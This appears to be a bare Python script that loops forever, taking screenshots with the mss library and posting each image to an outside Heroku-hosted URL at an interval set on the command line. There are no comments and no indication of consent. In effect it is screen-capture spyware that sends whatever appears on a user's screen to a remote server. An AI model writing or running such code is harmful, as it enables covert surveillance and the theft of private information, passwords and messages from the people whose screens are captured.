from mss import mss
from time import sleep
import requests
import sys

url = 'http://lujcho.herokuapp.com/ay'

def upload_latest(filename):
    files = {'file': open(filename, 'rb')}
    requests.post(url, files=files)

target = sys.argv[1]
to_sleep = int(sys.argv[2])

with mss() as sct:
    while True:
        filename = sct.shot(output=target)
        upload_latest(filename)

        sleep(to_sleep)

